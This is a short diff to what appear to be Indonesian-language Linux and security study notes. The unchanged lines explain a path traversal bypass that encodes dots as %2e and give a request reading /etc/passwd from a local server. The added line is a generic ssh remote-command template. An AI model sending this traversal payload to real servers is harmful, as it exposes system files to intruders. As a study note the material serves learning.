@@ -91,3 +91,6 @@ sestatus #untuk cek status selinux
 - karakter dot kedua dienkripsi sebagai %2e, “…/” berubah menjadi “.%2e/” dan berhasil melewati pemeriksaan.
 - GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
 Host: 127.0.0.1:8080
+
+
+ssh -OPTIONS -p SSH_PORT user@remote_server "remote_command1; remote_command2; remote_script.sh"
